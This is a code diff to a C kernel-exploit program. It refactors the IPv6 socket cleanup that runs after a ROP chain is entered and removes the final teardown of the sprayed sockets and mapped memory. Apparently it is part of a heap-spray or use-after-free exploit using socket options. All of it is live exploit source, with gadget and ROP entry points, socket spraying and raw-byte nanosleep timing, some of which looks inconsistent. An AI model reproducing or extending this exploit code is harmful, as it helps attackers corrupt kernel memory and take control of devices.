@@ -219,6 +219,23 @@ static void reset_ipv6_opts(int s) {
     setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
 }
 
+void iterative_socket_cleanup(int sock) {
+
+    for (int i = 0; i < 3; i++) {
+        struct in6_pktinfo safe = {0};
+        set_pktinfo(sock, (char*)&safe);
+
+        int tclass_reset = -1;
+        setsockopt(sock, IPPROTO_IPV6, IPV6_TCLASS, &tclass_reset, sizeof(tclass_reset));
+
+        setsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
+        setsockopt(sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, NULL, 0);
+
+        shutdown(sock, SHUT_RDWR);
+
+        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL);
+    }
+}
 
 // External inputs from gadgets and ROP buffers
 void (*enter_krop)(void);
@@ -337,11 +354,7 @@ int main() {
 
     enter_krop();
 
-    struct in6_pktinfo safe_pktinfo = {0};  // No .ipi6_addr = in6addr_any
-    set_pktinfo(master_sock, (char*)&safe_pktinfo);
-    int zero = 0;
-    setsockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, &zero, sizeof(zero));
-    shutdown(master_sock, SHUT_RDWR);
+    iterative_socket_cleanup(master_sock);
 
     nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL); // ~100μs
 	
@@ -373,20 +386,6 @@ int main() {
     }
 
     nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL); // ~100μs
-
-    struct in6_pktinfo safe = {0};
-    set_pktinfo(master_sock, (char*)&safe);
-
-    for (int i = 0; i < SPRAY_TOTAL; i++) if (spray_sock[i] >= 0) reset_ipv6_opts(spray_sock[i]);
-    reset_ipv6_opts(master_sock);
-    reset_ipv6_opts(kevent_sock);
-
-	cleanup_sockets(spray_sock, SPRAY_TOTAL);
-    close(kevent_sock);
-    close(master_sock);
-    munmap(spray_map, spray_size);
-
-    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\x20\xA1\07\0\0\0", NULL); // ~120μs
 
 	return 0;
 }
